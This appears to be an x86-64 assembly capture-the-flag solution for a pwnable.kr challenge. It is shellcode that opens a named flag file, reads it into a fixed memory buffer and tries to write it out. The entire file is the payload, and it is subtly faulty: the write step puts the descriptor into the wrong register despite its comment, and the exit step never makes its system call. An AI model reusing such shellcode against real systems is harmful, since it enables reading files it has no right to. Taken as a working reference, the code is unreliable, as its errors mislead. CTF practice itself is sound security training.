// int fd = open("stupid filename", O_RDONLY) 		#define O_RDONLY 0x0000
// read(fd, 0x2020a0, 10000)
// write(1, 0x2020a0, 10000) 											1 = stdout

// https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

jmp fn

open:
	// open()
	mov $2, %rax 		// open is syscall 2
	// mov $fn, %rdi 	// rdi is filename
	pop %rdi
	mov $0, %rsi 		// rsi is flags
	syscall
	// %rax contains file desriptor
	mov %rax, %rbx

	// read()
read:
	mov $0, %rax 		// read is syscall 0
	mov %rbx, %rdi  // rdi is file descriptor (from %rax)
	mov $0x2020a0, %rsi	// rsi is char buf (0x2020a0 - .data)
	mov $10000, %rdx 		// rdx is size to be read
	syscall
	// %rax contains number of bytes read
	mov %rax, %rcx

	// write()
write:
	mov $1, %rax 		// write is syscall 1
	mov $1, %rsi		// rdi is file descriptor (1 = stdout)
	mov $0x2020a0, %rsi	// rsi is char buf (0x2020a0 - .data)
	mov %rcx, %rdx 		// rdx is size to be read
	syscall
	// %rax contains number of bytes written

	// exit()
exit:
	mov $60, %rax
	mov $0, %rdi

fn:
	call open
	.ascii "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
	.byte 0
